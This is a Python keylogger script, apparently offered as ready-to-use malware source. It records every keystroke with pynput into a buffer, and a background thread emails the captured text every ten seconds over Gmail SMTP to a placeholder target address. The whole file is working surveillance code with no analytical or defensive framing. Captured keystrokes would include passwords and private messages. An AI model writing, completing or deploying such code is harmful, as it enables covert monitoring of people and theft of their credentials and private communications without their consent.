import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from pynput import keyboard
import threading
import time

#initialize
CHECK_INTERVAL = 10 #interval for sending the email that contain your log in second
lock = threading.Lock()
keyText = ""

def on_press(key):
    global keyText
    
    if key == keyboard.Key.enter:#append a newline
        keyText += "\n"
    elif key == keyboard.Key.tab:#append a tab character
        keyText += "\t"
    elif key == keyboard.Key.space:#append a space
        keyText += " "
    elif key == keyboard.Key.shift:#ignored (does not add anything)
        pass
    elif key == keyboard.Key.backspace and len(keyText) == 0:#the string is emty so we ignore it
        pass
    elif key == keyboard.Key.backspace and len(keyText) > 0:#remove the last character
        keyText = keyText[:-1]
    elif key == keyboard.Key.ctrl_l or key == keyboard.Key.ctrl_r:#ignore
        pass
    elif key == keyboard.Key.esc:#stop script
        return False 
    else:
        keyText += str(key).strip("'")#add character to string
def worker():
    while True:
        time.sleep(CHECK_INTERVAL)#Wait for a set interval before checking text again
        with lock:
            sender_email = "YOUR EMAIL"
            receiver_email = "TARGET EMAIL"
            password = "App password"
            # This is a Google-generated app password, not your regular email password.
            # You can check how to get it here: https://support.google.com/mail/answer/185833?hl=en
            message = MIMEMultipart()
            message["From"] = sender_email
            message["To"] = receiver_email
            message["Subject"] = "KeyLogger_py"
            if keyText:#Only send email if there is captured key text

                body = keyText
                message.attach(MIMEText(body, "plain"))

                try:
                    server = smtplib.SMTP("smtp.gmail.com", 587)
                    server.starttls()
                    server.login(sender_email, password)
                    server.sendmail(sender_email, receiver_email, message.as_string())
                    print("Email sent successfully!")
                    server.quit()
                except Exception as e:
                    print(f"Error: {e}")
        
def main():
    t = threading.Thread(target=worker, daemon=True)
    # Create a new thread to run the 'worker' function in the background.
    # daemon=True means the thread will automatically close when the main program exits
    t.start()# Start the worker thread
    with keyboard.Listener(on_press=on_press) as listener:# The main thread listens for keyboard input
        print("Listener + worker started. Press keys (Esc to stop).")
        listener.join()# Keep the main thread alive to listen for key presses

if __name__ == "__main__":
    main()